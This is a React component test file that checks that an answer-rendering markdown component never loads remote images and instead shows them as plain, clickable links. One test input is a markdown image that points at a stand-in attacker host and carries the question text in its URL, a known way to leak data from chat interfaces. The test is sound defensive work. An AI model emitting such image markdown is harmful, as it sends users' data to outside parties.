import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, test } from "vitest";

import { AnswerMarkdown } from "./answer-markdown";

describe("AnswerMarkdown", () => {
  afterEach(cleanup);

  test("never renders images: a remote image would load (and leak data) without a click", () => {
    const md = "Status: ![build status](https://attacker.example/p.png?q=the+question)";
    const { container } = render(<AnswerMarkdown text={md} citations={null} onOpenCitation={() => {}} />);
    expect(container.querySelector("img")).toBeNull();
    // The image is shown as a plain link instead: visible, and only fetched if clicked.
    const link = screen.getByRole("link", { name: /build status/ });
    expect(link.getAttribute("href")).toBe("https://attacker.example/p.png?q=the+question");
    expect(link.getAttribute("rel")).toContain("noopener");
  });

  test("an image without alt text still gets a readable link", () => {
    render(<AnswerMarkdown text="![](https://example.com/x.png)" citations={null} onOpenCitation={() => {}} />);
    expect(screen.getByRole("link", { name: /image/i })).toBeTruthy();
  });
});
